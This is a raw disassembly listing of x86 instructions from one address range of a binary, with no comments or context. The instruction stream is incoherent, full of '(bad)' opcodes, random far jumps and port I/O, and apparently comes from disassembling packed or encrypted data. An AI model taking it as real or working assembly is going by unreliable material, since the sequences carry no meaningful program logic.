  41ed86:	sub    ah,BYTE PTR [ecx-0x77ad5563]
  41ed8c:	pusha  
  41ed8d:	lods   eax,DWORD PTR ds:[esi]
  41ed8e:	cmp    eax,0x8f2cdcf5
  41ed93:	jl     0x41ed77
  41ed95:	ret    
  41ed96:	leave  
  41ed97:	call   0x358e:0x502b45bc
  41ed9e:	mov    ebp,DWORD PTR [ecx+0x31]
  41eda1:	clc    
  41eda2:	enter  0x7f0,0x71
  41eda6:	in     eax,dx
  41eda7:	mov    WORD PTR [esi+0x29],gs
  41edaa:	mov    ebp,0x40907bab
  41edaf:	aam    0x87
  41edb1:	neg    DWORD PTR [edx+0x4e32acbe]
  41edb7:	jb     0x41edad
  41edb9:	inc    edx
  41edba:	sbb    edi,edi
  41edbc:	outs   dx,DWORD PTR ds:[esi]
  41edbd:	push   ss
  41edbe:	sbb    eax,0xc7b73974
  41edc3:	add    DWORD PTR [esi+eiz*8],ecx
  41edc6:	mov    esp,0x7ad18ea1
  41edcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edcc:	sbb    ecx,edi
  41edce:	int    0x42
  41edd0:	xlat   BYTE PTR ds:[ebx]
  41edd1:	fcom   QWORD PTR [edx+ecx*4-0x5d]
  41edd5:	mov    bh,0x66
  41edd7:	sub    al,0x5c
  41edd9:	jae    0x41ee18
  41eddb:	(bad)  
  41eddc:	imul   DWORD PTR [edx+0x11]
  41eddf:	call   0xaf27:0x65f52785
  41ede6:	jecxz  0x41ee10
  41ede8:	xchg   ecx,eax
  41ede9:	scas   eax,DWORD PTR es:[edi]
  41edea:	movq   mm6,mm5
  41eded:	adc    esp,ebp
  41edef:	xor    DWORD PTR [ebp+0x2c83291d],edi
  41edf5:	fwait
  41edf6:	cmp    DWORD PTR [esi],ecx
  41edf8:	add    DWORD PTR [ecx-0x1d3f3503],edx
  41edfe:	shl    DWORD PTR [eax+0x248c012],0x3f
  41ee05:	cmp    al,0xb6
  41ee07:	cwde   
  41ee08:	clc    
  41ee09:	addr16 dec edi
  41ee0b:	mov    ds:0xf0db48fd,al
  41ee10:	sbb    al,0x7c
  41ee12:	loope  0x41ee57
  41ee14:	sbb    eax,0x78b92b11
  41ee19:	test   eax,0xbbaf2852
  41ee1e:	sub    bh,BYTE PTR [ebx]
  41ee20:	mov    ds:0xc548e0b1,eax
  41ee25:	xchg   DWORD PTR [ecx-0x7862e4b6],ebx
  41ee2b:	dec    edi
  41ee2c:	mov    ebx,0xd4aae47d
  41ee31:	sar    BYTE PTR [edx-0x13],0x87
  41ee35:	inc    ebp
  41ee36:	out    dx,eax
  41ee37:	ins    DWORD PTR es:[edi],dx
  41ee38:	push   ss
  41ee39:	out    0x50,al
  41ee3b:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee3d:	sbb    al,BYTE PTR [ebx]
  41ee3f:	inc    edi
  41ee40:	ficomp WORD PTR [esi-0x514e6b37]
  41ee46:	mov    ecx,0x4fdde073
  41ee4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee4c:	fisttp DWORD PTR [eax+0x67218578]
  41ee52:	and    edx,edi
  41ee54:	cmc    
  41ee55:	mov    bh,al
  41ee57:	leave  
  41ee58:	sar    BYTE PTR [eax+eiz*1-0x2a],0x35
  41ee5d:	in     eax,dx
  41ee5e:	or     BYTE PTR [eax+0x25ec1330],al
  41ee64:	mov    ds:0xae0b30cd,al
  41ee69:	sbb    BYTE PTR [ebx+ecx*8+0x40],bl
  41ee6d:	jp     0x41ee9a
  41ee6f:	sbb    al,0xc6
  41ee71:	cli    
  41ee72:	sub    eax,0x830f37d4
  41ee77:	clc    
  41ee78:	aas    
  41ee79:	jg     0x41eee7
  41ee7b:	aas    
  41ee7c:	and    BYTE PTR [ebp-0x3e322342],bl
  41ee82:	fsub   QWORD PTR [edx-0x1e5be9b]
  41ee88:	jo     0x41ee76
  41ee8a:	aad    0xd2
  41ee8c:	imul   BYTE PTR [ebp*2+0x2e00a808]
  41ee93:	imul   ebx,esp,0x9aba6ab2
  41ee99:	outs   dx,BYTE PTR ds:[esi]
  41ee9a:	(bad)  
  41ee9b:	cmp    al,0x2c
  41ee9d:	jb     0x41ee4f
  41ee9f:	mov    bh,0x75
  41eea1:	test   ah,dl
  41eea3:	fild   WORD PTR [ebx-0x4b]
  41eea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eea7:	sbb    DWORD PTR [ecx-0x5a3fe9a5],eax
  41eead:	push   ebp
  41eeae:	addr16 and ch,bh
  41eeb1:	push   ebx
  41eeb2:	daa    
  41eeb3:	or     DWORD PTR [edi+0x5e],esp
  41eeb6:	ss jmp 0x23cf:0x4abeee91
  41eebe:	dec    edx
  41eebf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eec0:	xor    ah,cl
  41eec2:	stos   BYTE PTR es:[edi],al
  41eec3:	int3   
  41eec4:	push   ss
  41eec5:	stos   BYTE PTR es:[edi],al
  41eec6:	xchg   edx,eax
  41eec7:	in     al,dx
  41eec8:	xlat   BYTE PTR ds:[ebx]
  41eec9:	sub    al,0xa5
  41eecb:	dec    esp
  41eecc:	and    BYTE PTR [esi+0x5e775597],dl
  41eed2:	cli    
  41eed3:	add    BYTE PTR [eax+0x5e],bh
  41eed6:	fcomp  DWORD PTR [edi-0x68]
  41eed9:	xor    DWORD PTR [edi+0x4eb812fd],0xffffffb0
  41eee0:	sbb    eax,0x3a3529e
  41eee5:	or     eax,0xd674bbc4
  41eeea:	mov    ebp,0x6eb61068
  41eeef:	cld    
  41eef0:	das    
  41eef1:	aas    
  41eef2:	and    al,cl
  41eef4:	cli    
  41eef5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eef6:	dec    esp
  41eef7:	call   0xd76d:0x277daf6c
  41eefe:	mov    eax,ds:0xaf5fef2f
  41ef03:	pop    edx
  41ef04:	repnz push cs
  41ef06:	xchg   DWORD PTR [edi],edx
  41ef08:	mov    edi,0xa7df9eae
  41ef0d:	enter  0x4f31,0xd
  41ef11:	mov    esp,0x775d094e
  41ef16:	cld    
  41ef17:	outs   dx,DWORD PTR ds:[esi]
  41ef18:	data16 cmc 
  41ef1a:	lahf   
  41ef1b:	xchg   ebx,eax
  41ef1c:	retf   
  41ef1d:	(bad)  
  41ef1e:	js     0x41ef4f
  41ef20:	iret   
  41ef21:	push   ebx
  41ef22:	dec    esi
  41ef23:	mov    bl,0xad
  41ef25:	pop    ss
  41ef26:	bnd jne 0x41eedd
  41ef29:	sar    BYTE PTR [edi+0x1ce0aaf5],0x31
  41ef30:	mov    WORD PTR [eax],es
  41ef32:	mov    ds:0x65d1f861,eax
  41ef37:	test   al,0x8e
  41ef39:	out    0xad,al
  41ef3b:	test   eax,0x7d830e81
  41ef40:	push   edx
  41ef41:	dec    ebp
  41ef42:	and    DWORD PTR [ecx+0x75571357],edi
  41ef48:	jmp    0x87f0:0x83a07375
  41ef4f:	mov    eax,ds:0x14424e50
  41ef54:	cs ins BYTE PTR es:[edi],dx
  41ef56:	xchg   edx,eax
  41ef57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef58:	pop    esp
  41ef59:	enter  0xd094,0x2b
  41ef5d:	mov    ss,edi
  41ef5f:	mov    ds:0xca864af4,al
  41ef64:	sbb    bl,al
  41ef66:	push   ebx
  41ef67:	mov    ecx,0x78cd6f3b
  41ef6c:	cdq    
  41ef6d:	nop
  41ef6e:	xchg   BYTE PTR [edx+0x7a1474a6],cl
  41ef74:	nop
  41ef75:	jno    0x41ef15
  41ef77:	pop    edi
  41ef78:	or     DWORD PTR [esi+edi*1-0x45783a89],edi
  41ef7f:	xor    BYTE PTR [edi+eiz*2+0x4408e1e6],cl
  41ef86:	mov    eax,0x28d664cd
  41ef8b:	sbb    DWORD PTR [esi+ebp*8-0x6b],0x98ce889a
  41ef93:	mov    BYTE PTR [esi],cl
  41ef95:	ss push eax
  41ef97:	adc    eax,0xf3983070
  41ef9c:	xchg   esi,eax
  41ef9d:	ss dec edi
  41ef9f:	xchg   edi,eax
  41efa0:	lock retw 0x586c
  41efa5:	inc    ebp
  41efa6:	sub    eax,0xa0b98cf0
  41efab:	and    ebx,ecx
  41efad:	xor    ecx,DWORD PTR [edx-0x6f21d259]
  41efb3:	and    al,0xdb
  41efb5:	ins    DWORD PTR es:[edi],dx
  41efb6:	add    ebp,DWORD PTR [edi+ebx*2+0x74a2b6a8]
  41efbd:	or     eax,DWORD PTR [ebx-0x795a73c9]
  41efc3:	(bad)  
  41efc4:	lahf   
  41efc5:	bnd jae 0x41ef69
  41efc8:	js     0x41f030
  41efca:	adc    al,bl
  41efcc:	(bad)  
  41efcd:	cmp    eax,0x393aeda5
  41efd2:	inc    esi
  41efd3:	adc    eax,ebp
  41efd5:	push   edi
  41efd6:	dec    ebx
  41efd7:	dec    esi
  41efd8:	pushf  
  41efd9:	add    DWORD PTR [edx+0x28],esp
  41efdc:	jle    0x41ef95
  41efde:	mov    eax,ebp
  41efe0:	dec    edi
  41efe1:	in     al,dx
  41efe2:	nop
  41efe3:	mov    cl,0x95
  41efe5:	and    al,0xbe
  41efe7:	pop    edi
  41efe8:	mov    esp,edx
  41efea:	ins    DWORD PTR es:[edi],dx
  41efeb:	jns    0x41efa3
  41efed:	mov    ds:0x4f523700,al
  41eff2:	xor    ch,al
  41eff4:	dec    ecx
  41eff5:	out    dx,al
  41eff6:	and    BYTE PTR gs:[eax+eax*1],dh
  41effa:	mov    ds:0xfb14e500,al
  41efff:	sub    BYTE PTR [ecx],cl
  41f001:	bound  edx,QWORD PTR [ebp+0x3]
  41f004:	mov    bl,0xd0
  41f006:	mov    bl,0xb
  41f008:	mov    bh,0x31
  41f00a:	cld    
  41f00b:	mov    bl,0xdb
  41f00d:	add    ecx,DWORD PTR [ebx-0x1442b2dc]
  41f013:	out    0x22,ax
  41f016:	xor    BYTE PTR [edx+0x14b09206],0x36
  41f01d:	push   edi
  41f01e:	jg     0x41f02e
  41f020:	shl    DWORD PTR [edi+0x3e810406],1
  41f026:	jne    0x41f09d
  41f028:	shl    DWORD PTR [ebp-0x7048e6bb],cl
  41f02e:	or     eax,0xef76c63a
  41f033:	cs (bad) 
  41f036:	data16 mov dh,0xfe
  41f039:	ret    0x9801
  41f03c:	enter  0x7e6a,0xc3
  41f040:	ins    DWORD PTR es:[edi],dx
  41f041:	dec    ecx
  41f042:	sbb    BYTE PTR [esi-0xe],dh
  41f045:	or     BYTE PTR [esi-0x2db32b36],dl
  41f04b:	and    BYTE PTR [edx+0x1d81d23d],ah
  41f051:	dec    ecx
  41f052:	ret    
  41f053:	or     esp,esi
  41f055:	fcmovnbe st,st(6)
  41f057:	jns    0x41effd
  41f059:	and    BYTE PTR [edx],bl
  41f05b:	jbe    0x41eff2
  41f05d:	loop   0x41f046
  41f05f:	jo     0x41f0ad
  41f061:	push   cs
  41f062:	mov    WORD PTR [edx+0x83e1ce8],ds
  41f068:	mov    esp,0x1f3b10fb
  41f06d:	fwait
  41f06e:	mov    edx,0x52a965b0
  41f073:	jns    0x41f08a
  41f075:	push   edi
  41f076:	sub    ebp,edx
  41f078:	repnz inc edi
  41f07a:	xor    bh,BYTE PTR [edi+ecx*2]
  41f07d:	clc    
  41f07e:	xchg   BYTE PTR [eax+0x3da115c1],dl
  41f084:	into   
  41f085:	pop    DWORD PTR [ebx-0x6f]
  41f088:	mov    gs:0x1de4ceb8,al
  41f08e:	mov    ecx,0x476747b8
  41f093:	pop    ss
  41f094:	ror    DWORD PTR [esp+ecx*1],cl
  41f097:	mov    al,ds:0x8f2e0aaf
  41f09c:	mov    ch,0xef
  41f09e:	mov    bh,BYTE PTR [edx-0x3f]
  41f0a1:	push   eax
  41f0a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0a3:	out    dx,eax
  41f0a4:	test   BYTE PTR [edi+0x4d],0xeb
  41f0a8:	jae    0x41f0c8
  41f0aa:	xchg   esp,eax
  41f0ab:	add    BYTE PTR [esi],dl
  41f0ad:	lahf   
  41f0ae:	xor    eax,0x9d120eee
  41f0b3:	push   ds
  41f0b4:	push   edi
  41f0b5:	loop   0x41f126
  41f0b7:	pop    ecx
  41f0b8:	test   BYTE PTR [ebp-0x2],0x1
  41f0bc:	or     esp,eax
  41f0be:	xor    eax,0xc41d6e50
  41f0c3:	mul    BYTE PTR [ecx]
  41f0c5:	xor    eax,0x56b8e415
  41f0ca:	inc    ebx
  41f0cb:	shr    BYTE PTR [edi],0xf5
  41f0ce:	adc    BYTE PTR [esi+ebx*4],0x5d
  41f0d2:	fidiv  WORD PTR [eax-0x68]
  41f0d5:	test   al,0x61
  41f0d7:	loopne 0x41f0fc
  41f0d9:	xor    eax,0x5ac9bdd5
  41f0de:	adc    BYTE PTR [edi],0x20
  41f0e1:	inc    ecx
  41f0e2:	cmp    DWORD PTR [ebx],esi
  41f0e4:	sub    al,0xf8
  41f0e6:	and    BYTE PTR [eax-0x6a],ah
  41f0e9:	mov    al,ds:0xd8854d50
  41f0ee:	popa   
  41f0ef:	mov    bh,0x12
  41f0f1:	nop
  41f0f2:	or     DWORD PTR [ecx+0x7a315457],esp
  41f0f8:	and    DWORD PTR [ebp-0x23],eax
  41f0fb:	and    eax,0x7fa2e624
  41f100:	cld    
  41f101:	aam    0x3c
  41f103:	inc    esi
  41f104:	push   esi
  41f105:	pushf  
  41f106:	add    DWORD PTR fs:[eax+0x5d],eax
  41f10a:	int    0x1c
  41f10c:	lea    edi,[ebx+0x3c]
  41f10f:	mov    bl,0xeb
  41f111:	(bad)  [edi-0x23c5913e]
  41f117:	sahf   
  41f118:	mov    cl,BYTE PTR [ebp-0x188b9055]
  41f11e:	cld    
  41f11f:	retf   0x14f2
  41f122:	jnp    0x41f14f
  41f124:	popf   
  41f125:	test   BYTE PTR [ecx+0x54],0xc2
  41f129:	xor    cl,dh
  41f12b:	xor    dh,ch
  41f12d:	cld    
  41f12e:	xchg   esp,eax
  41f12f:	int3   
  41f130:	mov    bl,0x28
  41f132:	mov    esp,0x29308067
  41f137:	cmp    ah,bl
  41f139:	retf   0x6dd2
  41f13c:	pop    ebp
  41f13d:	scas   al,BYTE PTR es:[edi]
  41f13e:	pop    ds
  41f13f:	jecxz  0x41f105
  41f141:	push   esi
  41f142:	out    0xa0,al
  41f144:	ror    bl,1
  41f146:	pop    ebx
  41f147:	jmp    0x41f1a2
  41f149:	sahf   
  41f14a:	lods   eax,DWORD PTR ds:[esi]
  41f14b:	push   es
  41f14c:	retf   
  41f14d:	xor    esi,edi
  41f14f:	jle    0x41f1c3
  41f151:	push   0x39
  41f153:	jmp    0x41f102
  41f155:	push   edx
  41f156:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f157:	sahf   
  41f158:	jle    0x41f1b1
  41f15a:	push   cs
  41f15b:	adc    BYTE PTR [edx],bl
  41f15d:	mov    ecx,0x630d4f58
  41f162:	sbb    DWORD PTR [edi+ebp*8],0xcf4098f3
  41f169:	inc    edi
  41f16a:	enter  0x9232,0x53
  41f16e:	cli    
  41f16f:	lea    esi,[eax]
  41f171:	ror    esp,1
  41f173:	xchg   esp,eax
  41f174:	and    esi,DWORD PTR [ecx+0x1d1c96ff]
  41f17a:	lods   eax,DWORD PTR ds:[esi]
  41f17b:	call   ebx
  41f17d:	stos   DWORD PTR es:[edi],eax
  41f17e:	dec    edx
  41f17f:	scas   eax,DWORD PTR es:[edi]
  41f180:	dec    edi
  41f181:	imul   esp,DWORD PTR [eax],0xffffffe9
  41f184:	jbe    0x41f19d
  41f186:	imul   ebp,DWORD PTR [ecx+0x10],0x52
  41f18a:	push   ss
  41f18b:	imul   esp,DWORD PTR [esi-0x79],0x4c38ea64
  41f192:	ins    BYTE PTR es:[edi],dx
  41f193:	out    dx,eax
  41f194:	inc    edx
  41f195:	test   esi,edi
  41f197:	adc    al,0x7
  41f199:	aam    0xbe
  41f19b:	loope  0x41f1f2
  41f19d:	add    eax,0x71064f88
  41f1a2:	push   ss
  41f1a3:	popf   
  41f1a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1a5:	stos   BYTE PTR es:[edi],al
  41f1a6:	push   esi
  41f1a7:	add    al,0x2a
  41f1a9:	std    
  41f1aa:	sbb    DWORD PTR [ecx],ecx
  41f1ac:	dec    edx
  41f1ad:	aas    
  41f1ae:	sub    ebp,0x42b34f89
  41f1b4:	push   ebx
  41f1b5:	mov    ch,0x32
  41f1b7:	inc    ebx
  41f1b8:	xchg   DWORD PTR [ebx],eax
  41f1ba:	or     esi,DWORD PTR [ebp+0x40c39acb]
  41f1c0:	in     al,0x63
  41f1c2:	xor    ebx,DWORD PTR [ecx+0x7de1f975]
  41f1c8:	dec    esp
  41f1c9:	cld    
  41f1ca:	and    eax,0x8b3719d1
  41f1cf:	push   cs
  41f1d0:	push   cs
  41f1d1:	xchg   esp,eax
  41f1d2:	cld    
  41f1d3:	jmp    0x2c34:0x844294f7
  41f1da:	pop    ebp
  41f1db:	int    0x61
  41f1dd:	inc    ebp
  41f1de:	out    dx,eax
  41f1df:	enter  0x79ea,0x5b
  41f1e3:	pop    es
  41f1e4:	div    dl
  41f1e6:	dec    eax
  41f1e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1e8:	xor    BYTE PTR [ecx+0x2c],ah
  41f1eb:	xor    al,0xc0
  41f1ed:	adc    ch,bl
  41f1ef:	pop    ss
  41f1f0:	and    eax,0xda6d4d1a
  41f1f5:	push   ss
  41f1f6:	(bad)  
  41f1f7:	pop    ebx
  41f1f8:	ins    BYTE PTR es:[edi],dx
  41f1f9:	sbb    esp,ecx
  41f1fb:	test   esi,0xb86903c2
  41f201:	jno    0x41f1ed
  41f203:	in     al,0xe4
  41f205:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f206:	fs je  0x41f18f
  41f209:	jnp    0x41f1f3
  41f20b:	inc    ecx
  41f20c:	(bad)  
  41f20d:	je     0x41f199
  41f20f:	int    0xb2
  41f211:	(bad)  
  41f212:	and    ecx,DWORD PTR [ebx]
  41f214:	adc    al,0x18
  41f216:	pop    ecx
  41f217:	bound  edx,QWORD PTR [edx-0x78]
  41f21a:	out    dx,al
  41f21b:	mov    ebp,0x3fdc4449
  41f220:	imul   ebp,DWORD PTR [edx+0x21],0x39
  41f224:	lods   eax,DWORD PTR ds:[esi]
  41f225:	mov    al,0xe4
  41f227:	push   esp
  41f228:	(bad)  
  41f229:	loopne 0x41f21d
  41f22b:	pushf  
  41f22c:	je     0x41f24f
  41f22e:	mov    edi,0x851e4b3a
  41f233:	mov    ds:0x5676159d,al
  41f238:	mov    edx,0x87070525
  41f23d:	addr16 ja 0x41f1f3
  41f240:	out    dx,eax
  41f241:	jae    0x41f1c8
  41f243:	jo     0x41f207
  41f245:	inc    ebp
  41f246:	ficomp WORD PTR [ebx]
  41f248:	aam    0x21
  41f24a:	jae    0x41f270
  41f24c:	retf   0x2c9c
  41f24f:	mov    ah,0xb6
  41f251:	out    0xa0,eax
  41f253:	adc    al,0xf0
  41f255:	jns    0x41f258
  41f257:	dec    ebp
  41f258:	jmp    0x41f1e0
  41f25a:	js     0x41f22f
  41f25c:	cdq    
  41f25d:	ret    0xb64c
  41f260:	addr16 sti 
  41f262:	mov    dl,0x47
  41f264:	jmp    0x20eb:0xe96871d6
  41f26b:	inc    edx
  41f26c:	shr    BYTE PTR [esi+edi*4-0x7c],1
  41f270:	cli    
  41f271:	dec    ebp
  41f272:	adc    al,0xe0
  41f274:	or     al,0x60
  41f276:	popf   
  41f277:	inc    edi
  41f278:	ins    DWORD PTR es:[edi],dx
  41f279:	dec    eax
  41f27a:	fadd   QWORD PTR [ebp-0xe0e10e8]
  41f280:	xor    DWORD PTR [ecx-0x1a],eax
  41f283:	call   0x9f3a971d
  41f288:	pop    ss
  41f289:	inc    ebp
  41f28a:	out    0xad,eax
  41f28c:	jno    0x41f30b
  41f28e:	push   ebp
  41f28f:	jbe    0x41f279
  41f291:	(bad)  
  41f292:	ret    
  41f293:	push   0xffffff87
  41f295:	and    eax,0xb33b3665
  41f29a:	mov    bl,0x84
  41f29c:	and    bh,dl
  41f29e:	push   es
  41f29f:	retf   0xdc6b
  41f2a2:	jns    0x41f308
  41f2a4:	je     0x41f2db
  41f2a6:	mov    edi,0x9fb17096
  41f2ab:	mov    al,0x41
  41f2ad:	push   eax
  41f2ae:	mov    bh,0xb1
  41f2b0:	pop    ebx
  41f2b1:	nop
  41f2b2:	cli    
  41f2b3:	outs   dx,DWORD PTR ds:[esi]
  41f2b4:	xor    eax,0xe8b52e03
  41f2b9:	sub    al,0x72
  41f2bb:	or     eax,0xbd629ab2
  41f2c0:	fiadd  WORD PTR [edi+0x41a468eb]
  41f2c6:	call   0xe85d7141
  41f2cb:	mov    DWORD PTR [eax],ebx
  41f2cd:	arpl   WORD PTR [ecx-0x2e],si
  41f2d0:	sub    ecx,DWORD PTR [ebp+0x7a]
  41f2d3:	std    
  41f2d4:	repz loope 0x41f2bc
  41f2d7:	loope  0x41f349
  41f2d9:	iret   
  41f2da:	mov    esi,0x11aa7066
  41f2df:	mov    eax,0x60f43c85
  41f2e4:	xor    BYTE PTR [ebx+0x43668057],0x26
  41f2eb:	test   al,0x72
  41f2ed:	lods   al,BYTE PTR ds:[esi]
  41f2ee:	xchg   esp,eax
  41f2ef:	int    0x8
  41f2f1:	mov    bl,bh
  41f2f3:	pop    edi
  41f2f4:	cmp    eax,0xa94c2318
  41f2f9:	jns    0x41f2c3
  41f2fb:	sub    BYTE PTR [eax],dl
  41f2fd:	js     0x41f2d7
  41f2ff:	adc    al,0x2e
  41f301:	je     0x41f37c
  41f303:	sti    
  41f304:	and    eax,0x82413132
  41f309:	push   edi
  41f30a:	mov    ebx,0xb9ed3a4
  41f30f:	shl    BYTE PTR [edi],cl
  41f311:	jno    0x41f2a9
  41f313:	sub    eax,0xb10b1eaa
  41f318:	dec    ebx
  41f319:	and    ebx,DWORD PTR [edi+0x71]
  41f31c:	scas   al,BYTE PTR es:[edi]
  41f31d:	retf   0x9306
  41f320:	cmp    edx,DWORD PTR [bp+si]
  41f323:	and    esi,DWORD PTR [esp+esi*8-0x1d]
  41f327:	pop    eax
  41f328:	add    DWORD PTR [ecx+0x72],edx
  41f32b:	sahf   
  41f32c:	outs   dx,DWORD PTR ds:[esi]
  41f32d:	retf   
  41f32e:	out    dx,al
  41f32f:	sbb    DWORD PTR [ebx],0x73
  41f332:	xchg   esp,eax
  41f333:	lea    eax,[esi]
  41f335:	dec    eax
  41f336:	jg     0x41f34c
  41f338:	ficomp WORD PTR [esi+0x31d5533f]
  41f33e:	jb     0x41f322
  41f340:	pusha  
  41f341:	cmp    ch,BYTE PTR [esi]
  41f343:	push   edi
  41f344:	add    BYTE PTR [ebx],bl
  41f346:	adc    esi,DWORD PTR [edx-0xe0f6d5a]
  41f34c:	adc    al,0x20
  41f34e:	pop    di
  41f350:	inc    ecx
  41f351:	ds leave 
  41f353:	psllq  mm1,mm3
  41f356:	add    ecx,DWORD PTR [edi+ebp*1-0x59]
  41f35a:	jnp    0x41f3ab
  41f35c:	jno    0x41f346
  41f35e:	sub    BYTE PTR [ecx+0x7ba8c75],ah
  41f364:	mov    esp,0xf5ac598c
  41f369:	call   0x649a0c58
  41f36e:	inc    ecx
  41f36f:	mov    esp,0xd185ac19
  41f374:	jl     0x41f3f1
  41f376:	mov    dh,0xf1
  41f378:	loope  0x41f338
  41f37a:	mov    bh,0x5e
  41f37c:	xchg   esi,esi
  41f37e:	es (bad) 
  41f380:	fld    TBYTE PTR [ebp-0x5]
  41f383:	sbb    bh,BYTE PTR [edi]
  41f385:	fcmovnb st,st(6)
  41f387:	stos   BYTE PTR es:[edi],al
  41f388:	fistp  DWORD PTR [ebp+0xc]
  41f38b:	jb     0x41f38e
  41f38d:	int3   
  41f38e:	gs js  0x41f3be
  41f391:	adc    BYTE PTR [eax-0x3483f64f],bh
  41f397:	ins    DWORD PTR es:[edi],dx
  41f398:	sti    
  41f399:	lahf   
  41f39a:	pop    edx
  41f39b:	repnz mov al,0x2e
  41f39e:	std    
  41f39f:	dec    ecx
  41f3a0:	fisubr DWORD PTR [eax]
  41f3a2:	jmp    0x3fcc:0xc05d84e7
  41f3a9:	(bad)  
  41f3aa:	shl    DWORD PTR [esp+ebp*1],cl
  41f3ad:	xor    dl,BYTE PTR [ecx+ebx*8]
  41f3b0:	sbb    ebp,ebp
  41f3b2:	jno    0x41f3cf
  41f3b4:	xlat   BYTE PTR ds:[ebx]
  41f3b5:	mov    dh,0xa0
  41f3b7:	jle    0x41f3a2
  41f3b9:	dec    esp
  41f3ba:	pushf  
  41f3bb:	add    bh,ch
  41f3bd:	mov    edi,0xec17b509
  41f3c2:	fwait
  41f3c3:	mov    DWORD PTR [esi],ebp
  41f3c5:	inc    esi
  41f3c6:	and    esp,DWORD PTR [ecx-0x725152bf]
  41f3cc:	addr16 jns 0x41f3d2
  41f3cf:	push   edx
  41f3d0:	add    DWORD PTR [eax-0x1bb4e8d3],eax
  41f3d6:	lods   eax,DWORD PTR ds:[esi]
  41f3d7:	push   edx
  41f3d8:	mov    al,ds:0x29f83318
  41f3dd:	int    0xac
  41f3df:	xor    eax,0x14e64e4
  41f3e4:	pop    esi
  41f3e5:	aaa    
  41f3e6:	jp     0x41f453
  41f3e8:	ror    DWORD PTR [esi+0x2fba2ccb],0x75
  41f3ef:	adc    eax,esi
  41f3f1:	add    DWORD PTR [eax-0x61],edi
  41f3f4:	fwait
  41f3f5:	push   cs
  41f3f6:	mov    DWORD PTR [eax+0x7c],ecx
  41f3f9:	and    al,0xf3
  41f3fb:	clc    
  41f3fc:	push   ss
  41f3fd:	loopne 0x41f42b
  41f3ff:	push   cs
  41f400:	ror    BYTE PTR [edi+0x4ca6c621],0x60
  41f407:	xor    BYTE PTR [edi],cl
  41f409:	dec    ebx
  41f40a:	outs   dx,DWORD PTR ds:[esi]
  41f40b:	(bad)  
  41f40c:	fstp   QWORD PTR [esi-0x1]
  41f40f:	int3   
  41f410:	mov    ebx,esp
  41f412:	(bad)  
  41f413:	or     bh,BYTE PTR [ecx]
  41f415:	or     bl,BYTE PTR [eax+ebp*1-0xae5202a]
  41f41c:	xchg   ecx,eax
  41f41d:	cmp    eax,0x1d19e420
  41f422:	jmp    0x1ff3328e
  41f427:	push   esp
  41f428:	inc    esi
  41f429:	pusha  
  41f42a:	inc    BYTE PTR [esi+0x48]
  41f42d:	aas    
  41f42e:	xchg   esp,eax
  41f42f:	mov    bh,0x6f
  41f431:	fwait
  41f432:	mov    ecx,?
  41f434:	test   BYTE PTR [esi],ah
  41f436:	cmc    
  41f437:	(bad)  
  41f439:	push   esi
  41f43a:	mov    esp,0xbe718f52
  41f43f:	add    bl,bh
  41f441:	outs   dx,DWORD PTR ds:[esi]
  41f442:	out    dx,eax
  41f443:	xchg   ecx,eax
  41f444:	fst    DWORD PTR [ebp+0x77]
  41f447:	xor    BYTE PTR [eax+0x5a1e6dd1],0x59
  41f44e:	jno    0x41f3f6
  41f450:	xor    eax,0xc513ff00
  41f455:	mov    ebx,0x6f31941
  41f45a:	inc    esp
  41f45b:	imul   ebx,esi,0x78
  41f45e:	sub    BYTE PTR [ecx],bh
  41f460:	dec    eax
  41f461:	call   0x2340:0x485c653f
  41f468:	call   0x80eb840d
  41f46d:	fdivr  st(5),st
  41f46f:	out    0x68,eax
  41f471:	(bad)  
  41f472:	jle    0x41f4b1
  41f474:	pop    esp
  41f475:	out    0x80,eax
  41f477:	stos   DWORD PTR es:[edi],eax
  41f478:	cmp    BYTE PTR [edx],ch
  41f47a:	clc    
  41f47b:	pop    edi
  41f47c:	sub    ch,BYTE PTR [eax+0x54e118d9]
  41f482:	aad    0xf2
  41f484:	dec    ebx
  41f485:	mov    al,0x42
  41f487:	arpl   WORD PTR [edx],bp
  41f489:	(bad)  
  41f48a:	sbb    ebp,ebp
  41f48c:	or     bh,BYTE PTR [ebp-0x425d2125]
  41f492:	test   BYTE PTR [ecx+0x74afcb8a],0x13
  41f499:	inc    ebp
  41f49a:	sbb    al,0xd
  41f49c:	enter  0xcf82,0x95
  41f4a0:	mov    eax,ds:0xae9e6472
  41f4a5:	out    dx,al
  41f4a6:	xchg   ebp,eax
  41f4a7:	cmp    dl,bh
  41f4a9:	sub    BYTE PTR [eax-0x3e],cl
  41f4ac:	mov    bl,0xd6
  41f4ae:	cmp    al,0x11
  41f4b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4b1:	neg    DWORD PTR [ebx+ecx*2-0x70]
  41f4b5:	test   BYTE PTR [ebx-0x77],dl
  41f4b8:	jns    0x41f455
  41f4ba:	mov    ah,0x5d
  41f4bc:	aad    0x34
  41f4be:	(bad)  
  41f4bf:	sub    al,ah
  41f4c1:	scas   eax,DWORD PTR es:[edi]
  41f4c2:	ja     0x41f4d0
  41f4c4:	push   edx
  41f4c5:	sub    BYTE PTR [eax-0x16458a38],ah
  41f4cb:	lods   eax,DWORD PTR ds:[esi]
  41f4cc:	sbb    eax,0x3169b497
  41f4d1:	call   0xb6423400
  41f4d6:	add    al,0x37
  41f4d8:	push   ds
  41f4d9:	xchg   DWORD PTR [ebp+0x1e1cc2eb],edx
  41f4df:	mov    al,ds:0x7c26e3f9
  41f4e4:	cmp    DWORD PTR [eax+ebx*8-0x23d7435],ecx
  41f4eb:	das    
  41f4ec:	mov    ebp,0x7def7cd2
  41f4f1:	in     al,dx
  41f4f2:	dec    ebp
  41f4f3:	fst    QWORD PTR [edi+0x11f82555]
  41f4f9:	cmp    al,0xb6
  41f4fb:	hlt    
  41f4fc:	dec    edx
  41f4fd:	(bad)  
